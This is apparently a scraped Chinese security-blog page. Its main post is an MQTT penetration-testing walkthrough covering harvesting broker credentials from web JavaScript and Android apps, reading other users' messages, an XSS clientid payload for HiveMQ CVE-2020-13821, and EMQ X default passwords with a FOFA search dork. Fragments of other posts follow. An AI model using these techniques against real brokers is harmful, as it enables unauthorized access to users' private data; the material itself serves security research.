&lt;p&gt;在整个物联网或车联网架构中，MQTT的部分通常应用在移动端、管理端、Web端、设备端。而MQTT协议中的三种角色是发布者（PUBLISHER）、订阅者（SUBCRIBER）、代理（BROKER）。发布者（PUBLISHER）和订阅者（SUBCRIBER）通过代理（BROKER）来发布和订阅消息。这两个角色在实际场景中主要应用是移动端、Web端、设备端；代理（BROKER）一般是服务器，可以由activemq、hivemq、emqx等许多软件来搭建。在开发过程中，不同的设备，技术特点也有所不同。其使用的协议除了mqtt外，Web端通常使用websocket的方式来进行收发消息。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967523996.png&#34; alt=&#34;mqtt应用场景&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;center&gt;EMQ X Broker 场景&lt;/center&gt;
&lt;h2 id=&#34;0x00-获取mqtt认证信息&#34;&gt;0x00 获取MQTT认证信息&lt;/h2&gt;
&lt;p&gt;目前对于MQTT的开发中的安全还尚未受到广泛关注，这使得有多种方式在移动端、Web端、设备端获取到MQTT的认证与连接信息。通过获取的信息来进一步实现越权访问、发布恶意内容等攻击。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;由于设备方面暂未找到案例，这里将以Web端和移动端案例来进行说明。&lt;/p&gt;
&lt;h3 id=&#34;开发的一点知识&#34;&gt;&lt;strong&gt;开发的一点知识&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;通过查阅一些开发资料，可以发现常见的几个MQTT的javascript库：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hivemq.com/blog/mqtt-client-library-encyclopedia-paho-js&#34;&gt;Paho.js&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hivemq.com/blog/mqtt-client-library-mqtt-js&#34;&gt;MQTT.js&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hivemq.com/blog/mqtt-client-library-encyclopedia-mqttelements&#34;&gt;mqtt-elements&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hivemq.com/blog/mqtt-client-library-mqtt-dart&#34;&gt;MQTT.DART&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在实际的研究过程中发现尤其以paho.js居多。在实际的渗透过程中需要多留意，使用本库基本可以确定Web端应用了MQTT的。以下我就介绍几个获取MQTT的几个小技巧。&lt;/p&gt;
&lt;h3 id=&#34;实战工具&#34;&gt;&lt;strong&gt;实战工具&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Chrome 浏览器&lt;/li&gt;
&lt;li&gt;Burp Suite&lt;/li&gt;
&lt;li&gt;source detecotor&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;好了，有了这几个就够了。开始我们的实战之旅。&lt;/p&gt;
&lt;h3 id=&#34;获取方法&#34;&gt;&lt;strong&gt;获取方法&lt;/strong&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;web应用中直接捕获&lt;/strong&gt;&lt;br&gt;
在浏览目标时我一般会打开Chrome浏览器的开发者调试工具，通过查看请求信息或这直接搜索mqtt的字样来确定是否使用MQTT的javascript文件。另外一个就是可以查看websockets请求看是否有进行mqtt的连接操作等。&lt;/p&gt;
&lt;p&gt;一旦发现使用MQTT后，就可以继续查看javascript文件来找到连接的host、端口、用户名以及密码信息。对于目前流行的云厂商，一般还会开启tls。或者这些信息后，我们就可以进行深入的分析或利用。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967556371.png&#34; alt=&#34;web应用中获取&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;除此之外，我也喜欢开启Brup suite记录通信流量，而且Brup suite支持websockets的记录。通过对历史记录的搜索功能可以快速发现MQTT相关内容。也可以根据个人习惯来快速确定。值得一提的是，一些内容在访问主页时就可以发现，有一些则会在一些其他页面，对于一些比较多的页面，可以使用爬虫的方式来提高效率，如通过headless的方式或者使用一些开源的2.0爬虫也可以。所有爬虫的流量经过Burp suite即可。对于流量比较大的，可以使用burp的loggeer++插件将流量记录到elasticsearch中。当然这里使用其他的代理也可以，如mitmproxy、goproxy等。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967583808.png&#34; alt=&#34;burpsuite获取mqtt信息&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;除此之外，还可以通过分析javascript文件中的连接信息，进行批量爬取来发现mqtt信息。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;通过.map文件获取源代码来获取&lt;/strong&gt;&lt;br&gt;
在实际的过程中可能会遇到只有一个登录页面，登录页面只有引用mqtt库的js文件，并没有发起请求。爬虫也无法访问到页面时怎么办呢？目前的许多网站喜欢使用webpack打包javascript文件，其中包括了vue开发的站点。在这种情况时，可以试试是否存在.map文件，一旦在实战中探测到这类文件，那么就可以下载目标网站的javascript的源代码文件。这里我比较喜欢使用source detecotor来实现。关于source detecotor的安装与使用可以看&lt;a href=&#34;https://bacde.me/post/unpack-webpack-via-sourcemap/&#34;&gt;https://bacde.me/post/unpack-webpack-via-sourcemap/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;下图是通过下载源代码来发现其中的配置信息。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967607269.png&#34; alt=&#34;通过源代码获取mqtt信息&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;爆破js文件，从js文件中获取&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在上述方法都失效的情况下，还可以通过爆破js文件的路径来尝试获取信息。观察目标的js存放路径，结合常见的js文件路径生成字典进行探测。&lt;/p&gt;
&lt;p&gt;这里列举几个常见js文件名，大家可以收集自己的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;mqtt.js&lt;/li&gt;
&lt;li&gt;config.js&lt;/li&gt;
&lt;li&gt;main.js&lt;/li&gt;
&lt;li&gt;mqtt.class.js&lt;/li&gt;
&lt;li&gt;app.js&lt;/li&gt;
&lt;li&gt;env.js&lt;/li&gt;
&lt;li&gt;default.js&lt;/li&gt;
&lt;li&gt;index.js&lt;/li&gt;
&lt;li&gt;url.js&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可以多试试，或许有意想不到的效果。可以看看如下两个例子：&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967628546.png&#34; alt=&#34;爆破js文件1&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967641825.png&#34; alt=&#34;爆破js文件2&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;android应用各种获取配置信息&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;除web端之外,移动端可以通过反编译apk源代码搜索mqtt等关键字、查看xml配置文件来发现。除此之外，在研究中发现一些车企的移动端也使用了MQTT，但是他们将内容放在了so文件中，由于时间关系，本次还没来得及对其进行深入的分析。&lt;/p&gt;
&lt;p&gt;以下这个例子就是反编译app源码后，发现嵌入了一些页面文件，其中可以看到mqtt的配置信息。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967653590.png&#34; alt=&#34;android反编译源码获取mqtt信息&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;一些关键字&lt;/strong&gt;&lt;br&gt;
paho-mqtt/1.0.1/mqttws31.min.js&lt;br&gt;
paho-mqtt.js&lt;br&gt;
mqtt.aliyuncs.com&lt;br&gt;
mqtt.js&lt;/p&gt;
&lt;p&gt;iotdevicegateway&lt;/p&gt;
&lt;p&gt;一旦发现上述内容，基本上可以确定使用了mqtt。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;0x01-连接mqtt&#34;&gt;0x01 连接MQTT&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;连接发现的mqtt&lt;/strong&gt;&lt;br&gt;
web端中的mqtt一般通过websockets进行连接，使用mqtt-pwn是无法连接成功的。这里可以通过websockets的客户端进行连接。将发现的mqtt内容填写如工具中即可进行连接。连接成功后可以发布和订阅内容，订阅的topic一般也写在代码中。&lt;br&gt;
推荐一个在线工具&lt;a href=&#34;http://tools.emqx.io/&#34;&gt;http://tools.emqx.io/&lt;/a&gt;。界面如下图：&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967682085.png&#34; alt=&#34;emqx连接mqtt&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;带来的风险&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;获取了这些信息除了跟web代码中的存在什么样的安全问题呢？&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;敏感信息泄漏&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在实际的研究过程中可以发现，通过获取的信息连接后，我们可以查看到其他用户的信息，其中会包含敏感信息。这就导致了敏感信息泄漏。下图中的系统使用了阿里云的MQTT，由于泄漏了mqtt配置信息，通过连接并订阅topic，可以看到泄漏了不该我们应该看到的信息，如用户手机号码、昵称、以及管理员与用户对话内容。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967703581.png&#34; alt=&#34;mqtt敏感信息泄露&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;发布恶意内容的&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;连接成功后我们可以直接发布消息到队列中，这里我们可以直接绕过web端的防御，通过fuzz构造恶意的数据，比如植入xss攻击代码来实现攻击web端或移动端的用户。&lt;/p&gt;
&lt;p&gt;另外，网络上公开的一些管理平台同样因为过滤不严，导致存在xss。这可以使我们直接攻击管理员。这里介绍两个漏洞，CVE-2020-13821和CVE-2020-13932。编号CVE-2020-13821漏洞的产品是HiveMQ Broker management console中，攻击者可以通过恶意的clientid来攻击admin的控制台；编号CVE-2020-13932漏洞的产品是Apache ActiveMQ Artemis,攻击者可通过构造恶意的clientid或topics名字来攻击admin的控制台。&lt;/p&gt;
&lt;p&gt;这里测试CVE-2020-13821漏洞，该漏洞在hivemq4.4.0版本中已经修复，本地搭建的版本为hivemq 4.3.2。&lt;/p&gt;
&lt;p&gt;docker命令：&lt;code&gt;docker run -p 8080:8080 -p 1883:1883 hivemq/hivemq4:4.3.2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;以上映射的端口可以自己定义，我这里环境使用的是8990和2883。docker启动后，即可打开&lt;code&gt;http://127.0.0.1:8990&lt;/code&gt; （可改为自己的端口，默认是8080），用户名和密码为admin和hivemq。&lt;/p&gt;
&lt;p&gt;我们可以使用mqttfx进行连接，在clientid中加入xss payload &lt;code&gt;&amp;lt;img/src=x onerror=alert(1)&amp;gt;&lt;/code&gt;，ip和端口填入自己环境或目标信息，点击连接即可，当然在实战中如果需要用户名和密码，填入即可。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;10&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967729552.png&#34; alt=&#34;mqtt管理平台xss&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;回到hivemq的管理平台，点击&lt;code&gt;clients&lt;/code&gt;菜单，点击&lt;code&gt;Refresh Snaphot&lt;/code&gt;即可触发执行payload，这就是一个存储型的XSS。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;11&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967746199.png&#34; alt=&#34;mqtt管理平台xss&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;可获取其他更多信息&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通过连接上mqtt，可以尝试枚举其他topic的，来后去更多的内容，以此来检查是否存在更加敏感的信息，如gps位置、用户数据等。这里推荐一个工具mqttfx，跨平台软件。下面举一个例子。&lt;/p&gt;
&lt;p&gt;首先从web页面中获取到相关信息。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;12&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967765471.png&#34; alt=&#34;获取更多信息&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;接下来可以获取web扫描全部端口或nmap来识别mqtt协议。找到mqtt端口。通常端口都为默认的1883。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;13&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967784837.png&#34; alt=&#34;nmap扫描mqtt端口&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;可以通过获取的连接信息来添加到软件中或者使用mqtt-pwn进行操作，下图为使用mqttfx进行连接。接下来可以尝试后去更多信息来进行渗透。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;14&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967811498.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;15&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967826205.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;也可以使用mqtt-pwn进行连接，mqtt-pwn列出了系统的topics。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;16&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967833467.png&#34; alt=&#34;mqtt-pwn 连接mqtt获取topics&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;0x02-mqtt管理平台&#34;&gt;0x02 MQTT管理平台&lt;/h2&gt;
&lt;p&gt;对于MQTT应用之外，还可以关注管理平台。目前EMQ X是其中比较流行的一个 。&lt;/p&gt;
&lt;p&gt;EMQ X全称 Erlang/Enterprise/Elastic MQTT Broker，它是基于 Erlang/OTP 语言平台开发，支持大规模连接和分布式集群，发布订阅模式的百万级开源 MQTT 消息服务器。EMQ X常见端口和默认密码为：&lt;/p&gt;
&lt;p&gt;TCP 端口： 1883&lt;/p&gt;
&lt;p&gt;Websocket 端口： 8083&lt;/p&gt;
&lt;p&gt;TCP/TLS 端口： 8883&lt;/p&gt;
&lt;p&gt;Websocket/TLS 端口： 8084&lt;/p&gt;
&lt;p&gt;管理平台端口：18083&lt;/p&gt;
&lt;p&gt;默认用户名密码：admin/public&lt;/p&gt;
&lt;p&gt;FOFA Dork：(port=&amp;quot;18083&amp;quot;&amp;amp;&amp;amp;title=&amp;quot;dashboard&amp;quot;) || body=&amp;quot;href=/static/emq.ico&amp;quot;&lt;/p&gt;
&lt;p&gt;通过登录平台，可以很方便的看到客户端连接、主题、订阅信息等，还可以通过添加规则来过滤数据。本地搭建的效果如下：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;17&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967862299.png&#34; alt=&#34;管理平台默认口令&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;除此之外rabbitmq、hivemq等也都有管理的平台，这里可以参考网络上的内容即可，这里不做赘述。&lt;/p&gt;
&lt;h2 id=&#34;0x03-总结&#34;&gt;0x03 总结&lt;/h2&gt;
&lt;p&gt;本文主要研究在实际的应用中如何获取mqtt信息，以及获取的信息带来的潜在风险。MQTT方面的安全还有很多内容等待着我们去挖掘。我也在研究中，希望以此抛砖引玉，能够更多的大佬一起交流和研究。&lt;/p&gt;
&lt;p&gt;最后的重点，建议搭建本地搭建环境或者在授权情况下进行测试，不要对外网目标进行非法测试和破坏。否则造成的一切后果与本人无关。&lt;/p&gt;
&lt;h2 id=&#34;0x04-引用&#34;&gt;0x04 引用&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://www.eclipse.org/paho/files/jsdoc/Paho.MQTT.Client.html&#34;&gt;https://docs.aws.amazon.com/iot/latest/developerguide/mqtt-ws.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.eclipse.org/paho/files/jsdoc/Paho.MQTT.Client.html&#34;&gt;https://www.hivemq.com/blog/mqtt-over-websockets-with-hivemq/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.eclipse.org/paho/files/jsdoc/Paho.MQTT.Client.html&#34;&gt;https://www.eclipse.org/paho/files/jsdoc/Paho.MQTT.Client.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://tools.emqx.io/&#34;&gt;http://tools.emqx.io/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://bacde.me/post/unpack-webpack-via-sourcemap/&#34;&gt;https://bacde.me/post/unpack-webpack-via-sourcemap/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://payatu.com/advisory/hivemq-mqtt-broker---xss-over-mqtt&#34;&gt;https://payatu.com/advisory/hivemq-mqtt-broker---xss-over-mqtt&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2020-13932&#34;&gt;https://nvd.nist.gov/vuln/detail/CVE-2020-13932&lt;/a&gt;&lt;/p&gt;
">物联网安全之MQTT渗透实战</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/my-some-vulnerability-alert/"" data-c="
          &lt;p&gt;前几年做的一些漏洞分析复现或预警的文章，后来做管理岗，仅对感兴趣的漏洞做分析，写文写的少了。今天整理了下，存个档。&lt;br&gt;
注：由于国家政策限制，有一些只对外发了预警，详细的版本均发送给了监管机构。有一些访问404的是因为不方便公开细节。对于0day申请了cve编号，详情都发在sec-list。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1543.html&#34;&gt;【漏洞预警】pixie 在线图片编辑器全版本存在SSRF漏洞[0day]&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1555.html&#34;&gt;【漏洞预警】Onethink 全版本SSRF漏洞[0day]&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1542.html&#34;&gt;【漏洞预警】Struts2 最新命令执行漏洞S2-052[最新更新，PoC,漏洞绕过]&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1544.html&#34;&gt;Cockpit CMS SSRF漏洞 0day&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1545.html&#34;&gt;TPSHOP 多用户商城系统任意文件读取&amp;amp;&amp;amp;SSRF 0day&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1559.html&#34;&gt;【漏洞预警】Metinfo 5.3.5- 5.3.13 SSRF漏洞[0day]&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1517.html&#34;&gt;【漏洞预警】Metinfo 5.x.x版本 SQL注入漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1384.html&#34;&gt;威胁情报预警：Elasticsearch勒索软件事件&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1389.html&#34;&gt;威胁情报预警：Couchdb勒索事件&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;!-- more --&gt;
&lt;ol start=&#34;10&#34;&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1520.html&#34;&gt;【漏洞预警】D-link 850L等一系列产品存在多处漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1485.html&#34;&gt;【漏洞预警】浙江大华摄像存在0day后门&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1489.html&#34;&gt;【漏洞预警】Apache Struts2 远程代码执行漏洞S2-046&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1493.html&#34;&gt;【漏洞预警】IIS 6.0 远程代码执行0day&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1494.html&#34;&gt;【漏洞预警】PHPCMSV9_Getshell漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1497.html&#34;&gt;【漏洞预警】Jenkins未验证代码执行_CVE-2017-1000353&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1498.html&#34;&gt;【高危漏洞预警】Wordpress Core 远程代码执行0day（无需验证和插件）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1499.html&#34;&gt;【漏洞预警】Wordpress 全版本密码重置0day漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;[【漏洞预警】Samba远程代码执行漏洞][(ttps://nosec.org/home/detail/1502.html)&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1460.html&#34;&gt;【漏洞预警】Node.js 反序列化漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1475.html&#34;&gt;【漏洞预警】Wordpress NextGEN注入漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/2725.html&#34;&gt;【漏洞预警】致远OA 0day 漏洞预警&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1926.html&#34;&gt;【漏洞预警】Mini_httpd组件可能漏洞影响257万IOT设备（CVE-2018-18778）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/2491.html&#34;&gt;【威胁预警】iSCSI未授权访问漏洞，数万iSCSI可能受影响&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/2709.html&#34;&gt;【漏洞预警】Coremail配置信息泄露漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1748.html&#34;&gt;13万Mikrotik设备被植入挖矿代码&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1755.html&#34;&gt;【漏洞预警】Struts2最新RCE漏洞S2-057（CVE-2018-11776）-带POC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1705.html&#34;&gt;【漏洞预警】Weblogic最新远程命令执行漏洞（CVE-2018-2894&amp;amp;CVE-2018-2893）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1610.html&#34;&gt;【漏洞预警】GPON光纤路由器越权和远程命令执行漏洞（CVE-2018-10561 &amp;amp; CVE-2018-10562）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1616.html&#34;&gt;【漏洞预警】DrayTek公司多个型号路由器产品最新的0day漏洞，漏洞影响可能影响110万设备&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1621.html&#34;&gt;蚂蚁矿机多款型号存在远程命令执行漏洞（CVE-2018-11220）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1608.html&#34;&gt;【漏洞预警】Weblogic反序列化命令执行漏洞_CVE-2018-2628&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1605.html&#34;&gt;【事件分析】Cisco Smart Install安全漏洞&amp;amp;&amp;amp;远程代码执行漏洞【CVE-2018-0171】&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1606.html&#34;&gt;【漏洞预警】CVE-2018-1273 Spring Data Commons 远程代码执行漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1604.html&#34;&gt;【威胁预警】Weblogic wsl-wsat远程代码执行漏洞进行挖矿&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1583.html&#34;&gt;【漏洞预警】雄迈uc-httpd Web服务应用任意文件读取漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1541.html&#34;&gt;【漏洞预警】多款无线AP设备存在任意文件读取漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1495.html&#34;&gt;Shadow Brokers公布NSA黑客工具_包含众多Windows 0day漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1497.html&#34;&gt;【漏洞预警】Jenkins未验证代码执行_CVE-2017-1000353&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1367.html&#34;&gt;Jmoola! cms core最新任意文件上传漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1380.html&#34;&gt;PhpMailer存在远程代码执行漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1381.html&#34;&gt;【漏洞预警】PhpMailer存在任意代码执行漏洞补丁绕过(0day)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1397.html&#34;&gt;【漏洞预警】Wordpress 内容注入漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1617.html&#34;&gt;【威胁预警】Redis挖矿病毒预警&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
">自己的一些漏洞分析文章汇总【含0day】</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/mqtt-security-part-one/"" data-c="
          &lt;p&gt;MQTT 全称为 Message Queuing Telemetry Transport（消息队列遥测传输）是是ISO 标准(ISO/IEC PRF 20922)下基于发布/订阅范式的消息协议，由 IBM 发布。由于其轻量、简单、开放和易于实现的特点非常适合需要低功耗和网络带宽有限的IoT场景。比如遥感数据、汽车、智能家居、智慧城市、医疗医护等。&lt;/p&gt;
&lt;h2 id=&#34;mqtt协议&#34;&gt;MQTT协议&lt;/h2&gt;
&lt;p&gt;MQTT协议为大量计算能力有限，低带宽、不可靠网络等环境而设计，其应用非常广泛。目前支持的服务端程序也较丰富，其PHP，JAVA，Python，C，C#等系统语言也都可以向MQTT发送相关消息。 目前最新的版本为5.0版本，可以在https://github.com/mqtt/mqtt.github.io/wiki/servers   这个连接中看到支持MQTT的服务端软件。 其中hivemq中提到针对汽车厂商的合作与应用，在研究过程中会发现有汽车行业应用了MQTT协议。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://p1.ssl.qhimg.com/t01f74a80563218bc7a.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;以下列举我们关心的几项：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用发布/订阅的消息模式，支持一对多的消息发布；&lt;/li&gt;
&lt;li&gt;消息是通过TCP/IP协议传输；&lt;/li&gt;
&lt;li&gt;简单的数据包格式；&lt;/li&gt;
&lt;li&gt;默认端口为TCP的1883，websocket端口8083，默认消息不加密。8883端口默认是通过TLS加密的MQTT协议。&lt;/li&gt;
&lt;/ol&gt;
&lt;!-- more --&gt;
&lt;h3 id=&#34;发布订阅模式&#34;&gt;发布/订阅模式&lt;/h3&gt;
&lt;p&gt;MQTT协议中有三种角色和一个主要概念，三种角色分别是发布者（PUBLISHER）、订阅者（SUBCRIBER）、代理（BROKER），还有一个主要的概念为主题（TOPIC）。&lt;/p&gt;
